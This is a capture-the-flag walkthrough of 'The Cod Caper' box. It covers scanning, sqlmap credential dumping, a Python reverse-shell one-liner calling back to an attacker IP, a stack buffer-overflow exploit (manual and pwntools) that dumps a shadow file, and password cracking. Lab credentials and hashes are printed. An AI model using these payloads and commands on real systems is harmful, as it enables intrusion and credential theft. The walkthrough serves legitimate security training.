# The Cod Caper

## Host Enumeration

```
rustscan -a 10.10.63.104 -- -A -sC -sV | tee rustscan.log
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/gabriel/snap/rustscan/28/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.63.104:22
Open 10.10.63.104:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] 
Starting Nmap 7.60 ( https://nmap.org ) at 2021-04-14 17:45 BST
NSE: Loaded 146 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 17:45
Completed NSE at 17:45, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 17:45
Completed NSE at 17:45, 0.00s elapsed
Initiating Ping Scan at 17:45
Scanning 10.10.63.104 [2 ports]
Completed Ping Scan at 17:45, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:45
Completed Parallel DNS resolution of 1 host. at 17:45, 0.04s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 17:45
Scanning 10.10.63.104 [2 ports]
Discovered open port 80/tcp on 10.10.63.104
Discovered open port 22/tcp on 10.10.63.104
Completed Connect Scan at 17:45, 0.03s elapsed (2 total ports)
Initiating Service scan at 17:45
Scanning 2 services on 10.10.63.104
Completed Service scan at 17:45, 6.19s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.63.104.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 17:45
Completed NSE at 17:45, 1.29s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 17:45
Completed NSE at 17:45, 0.00s elapsed
Nmap scan report for 10.10.63.104
Host is up, received syn-ack (0.031s latency).
Scanned at 2021-04-14 17:45:50 BST for 8s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDs2k31WKwi9eUwlvpMuWNMzFjChpDu4IcM3k6VLyq3IEnYuZl2lL/dMWVGCKPfnJ1yv2IZVk1KXha7nSIR4yxExRDx7Ybi7ryLUP/XTrLtBwdtJZB7k48EuS8okvYLk4ppG1MRvrVojNPprF4nh5S0EEOowqGoiHUnGWOzYSgvaLAgvr7ivZxSsFCLqvdmieErVrczCBOqDOcPH9ZD/q6WalyHMccZWVL3Gk5NmHPaYDd9ozVHCMHLq7brYxKrUcoOtDhX7btNamf+PxdH5I9opt6aLCjTTLsBPO2v5qZYPm1Rod64nysurgnEKe+e4ZNbsCvTc1AaYKVC+oguSNmT
|   256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAmpmAEGyFxyUqlKmlCnCeQW4KXOpnSG6SwmjD5tGSoYaz5Fh1SFMNP0/KNZUStQK9KJmz1vLeKI03nLjIR1sho=
|   256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (EdDSA)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFBIRpiANvrp1KboZ6vAeOeYL68yOjT0wbxgiavv10kC
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 17:45
Completed NSE at 17:45, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 17:45
Completed NSE at 17:45, 0.00s elapsed
Read data files from: /snap/rustscan/28/usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.29 seconds
```

**Questions**

    1. How many ports are open on the target machine?

2

    2. What is the http-title of the web server?

Apache2 Ubuntu Default Page: It works

    3. What version is the ssh service?

OpenSSH 7.2p2 Ubuntu 4ubuntu2.8

    4. What is the version of the web server?

Apache/2.4.18

## Web Enumeration

Since the only services running are SSH and Apache, it is safe to assume that we should check out the webserver first for possible vulnerabilities.

```
nikto -h http://10.10.63.104 | tee nikto.log
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.10.63.104
+ Target Hostname:    10.10.63.104
+ Target Port:        80
+ Start Time:         2021-04-14 17:49:55 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x2aa6 0x59c3a236dfc00 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD 
+ OSVDB-3233: /icons/README: Apache default file found.
+ /administrator.php: Admin login page/section found.
+ 6544 items checked: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2021-04-14 17:53:55 (GMT1) (240 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.63.104/
[+] Threads      : 40
[+] Wordlist     : /opt/wordlist/big.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : php,txt,html,py,sh,js
[+] Timeout      : 10s
=====================================================
=====================================================
/.htpasswd (Status: 403)
/.htpasswd.sh (Status: 403)
/.htpasswd.js (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.txt (Status: 403)
/.htpasswd.html (Status: 403)
/.htpasswd.py (Status: 403)
/.htaccess (Status: 403)
/.htaccess.txt (Status: 403)
/.htaccess.html (Status: 403)
/.htaccess.py (Status: 403)
/.htaccess.sh (Status: 403)
/.htaccess.js (Status: 403)
/.htaccess.php (Status: 403)
/administrator.php (Status: 200)
/index.html (Status: 200)
/server-status (Status: 403)
=====================================================
=====================================================
```

**Questions**

    1. What is the name of the important file on the server

administrator.php

## Web Exploitation

The admin page seems to give us a login form. In situations like this it is always worth it to check for "low-hanging fruit". In the case of login forms one of the first things to check for is SQL Injection.

`sqlmap -u http://10.10.63.104/administrator.php --dump --forms | tee sqlmap.log`

```
Database: users
Table: users
[1 entry]
+----------+------------+
| username | password   |
+----------+------------+
| pingudad | secretpass |
+----------+------------+
```

**Questions**

    1. What is the admin username?

pingudad

    2. What is the admin password?

secretpass

    3. How many forms of SQLI is the form vulnerable to?

3

## Command Execution

It seems we have gained the ability to run commands. Let's try a nc reverse shell

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.32.89",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`

**Questions**

    1. How many files are in the current directory?

3

    2. So I still have an account?

Yes

    3. What is my ssh password?

pinguapingu

## LinEnum

LinEnum is a bash script that searches for possible ways to escalate privileges.

I copied this and linPEAS over to the system in order to adequately perform enumeration.

linenum.log and linpeas.log have been provided in this write-ups folder

`/opt/secret/root`

## pwndbg

```c
#include "unistd.h"
#include "stdio.h"
#include "stdlib.h"
void shell(){
setuid(1000);
setgid(1000);
system("cat /var/backups/shadow.bak");
}

void get_input(){
char buffer[32];
scanf("%s",buffer);
}

int main(){
get_input();
}
```

We know that this program expects 32 characters of input and then immediately exits. 

```
pwndbg> r < <(cyclic 50)
Starting program: /opt/secret/root < <(cyclic 50)

Program received signal SIGSEGV, Segmentation fault.
0x6161616c in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────
 EAX  0x1
 EBX  0x0
 ECX  0x1
 EDX  0xf775887c (_IO_stdfile_0_lock) ◂— 0
 EDI  0xf7757000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
 ESI  0xf7757000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
 EBP  0x6161616b ('kaaa')
 ESP  0xffa02410 ◂— 0xf700616d /* 'ma' */
 EIP  0x6161616c ('laaa')
───────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────
Invalid address 0x6161616c










────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────
00:0000│ esp  0xffa02410 ◂— 0xf700616d /* 'ma' */
01:0004│      0xffa02414 —▸ 0xffa02430 ◂— 0x1
02:0008│      0xffa02418 ◂— 0x0
03:000c│      0xffa0241c —▸ 0xf75bd637 (__libc_start_main+247) ◂— add    esp, 0x10
04:0010│      0xffa02420 —▸ 0xf7757000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
... ↓
06:0018│      0xffa02428 ◂— 0x0
07:001c│      0xffa0242c —▸ 0xf75bd637 (__libc_start_main+247) ◂— add    esp, 0x10
──────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────
 ► f 0 6161616c
   f 1 f700616d
─────────────────────────────────────────────────────────────────────────────────────────────────────────
Program received signal SIGSEGV (fault address 0x6161616c)
```

We can see that the EIP has been overwritten with our input. If we can modify the EIP to point to the shell function then we can make that execute instead. First we need to know exactly how many characters we need to provide in order to overwrite the EIP. This function is provided within cyclic - `cyclic -l 0x6161616c`.

```
pwndbg> cyclic -l 0x6161616c
44
```

After 44 characters we can overwrite the EIP

## Binary Exploitation: Manually

We know we need 44 characters of input then want to call the shell function. We need to find where the shell function is in memory so we know what to overwrite the EIP with.

```
pwndbg> disassemble shell
Dump of assembler code for function shell:
   0x080484cb <+0>: push   ebp
   0x080484cc <+1>: mov    ebp,esp
   0x080484ce <+3>: sub    esp,0x8
   0x080484d1 <+6>: sub    esp,0xc
   0x080484d4 <+9>: push   0x3e8
   0x080484d9 <+14>:    call   0x80483a0 <setuid@plt>
   0x080484de <+19>:    add    esp,0x10
   0x080484e1 <+22>:    sub    esp,0xc
   0x080484e4 <+25>:    push   0x3e8
   0x080484e9 <+30>:    call   0x8048370 <setgid@plt>
   0x080484ee <+35>:    add    esp,0x10
   0x080484f1 <+38>:    sub    esp,0xc
   0x080484f4 <+41>:    push   0x80485d0
   0x080484f9 <+46>:    call   0x8048380 <system@plt>
   0x080484fe <+51>:    add    esp,0x10
   0x08048501 <+54>:    nop
   0x08048502 <+55>:    leave  
   0x08048503 <+56>:    ret    
End of assembler dump.
```

44 characters need to be provided, then "0x080484cb" and the shell function should execute.

Modern CPU architectures are little endian, meaning that bytes are backwords - "0x080484cb" becomes "cb840408"

```bash
pingu@ubuntu:~$ python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root
root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:18277:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18277:0:99999:7:::
uuidd:*:18277:0:99999:7:::
papa:$1$ORU43el1$tgY7epqx64xDbXvvaSEnu.:18277:0:99999:7:::
Segmentation fault
```

Now we have output of the shadow backup, and this can be used in order to crack the root users password.

## Binary Exploitation: The pwntools way

Pwntools is a python library dedicated to making this from of attack much simpler.

```python
from pwn import *
proc = process('/opt/secret/root')
```

This imports the all the utilities from the pwntools library and creates a process that can be interacted with using pwntools functions.

We know that we need the memory address of the shell function, and pwntools provides a way to obtain that with ELF(). ELF allows us to get various memory addresses of important points in our binary, including the memory address of the shell function.

``` python
from pwn import *
proc = process('/opt/secret/root')
elf = ELF('/opt/secret/root')
shell_func = elf.symbols.shell
```

shell_func is used to hold the memory address of the shell function. Now we need to form the payload.

fit allows us to form a payload by combining characters and our memory address. To send the payload we can use a method in our proc variable, proc.sendline(), which just sends whatever data we want to the binary. Finally we can use proc.interactive(), to view the full output of the process.

The full code is as follows

```python
from pwn import *
proc = process('/opt/secret/root')
elf = ELF('/opt/secret/root')
shell_func = elf.symbols.shell
payload = fit({
44: shell_func # this adds the value of shell_func after 44 characters
})
proc.sendline(payload)
proc.interactive()
```
```
pingu@ubuntu:~$ python overflow.py
[+] Starting local process '/opt/secret/root': pid 966
[*] '/opt/secret/root'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[*] Switching to interactive mode
[*] Process '/opt/secret/root' stopped with exit code -11 (SIGSEGV) (pid 966)
root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:18277:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18277:0:99999:7:::
uuidd:*:18277:0:99999:7:::
papa:$1$ORU43el1$tgY7epqx64xDbXvvaSEnu.:18277:0:99999:7:::
[*] Got EOF while reading in interactive
$  
```

This also succeeds in retrieving the shadow backup file

## Finishing The Job

Now that the password hashes have been obtained, they can be cracked in order to get the root password.

Hashcat is recommended for this task but before I bothered finding out the correct mode, I threw the hash into john in the meantime. John was able to crack the root password with `/opt/john/run/john hash --wordlist=/opt/wordlist/rockyou.txt`.

For completeness I also attempted this in hashcat with the syntax `hashcat -a0 -m1800 hash /opt/wordlist/rockyou.txt`. Hashcat was slightly faster to crack the root password, but both methods were perfectly acceptable for this task.

**Questions**

    1. What is the root password?

love2fish

## Thank you!

Now that the box has been rooted we can call this task complete.

Further reading:

* [pwntools docs](http://docs.pwntools.com/en/stable/)
* [pwndbg docs](https://browserpwndbg.readthedocs.io/en/docs/)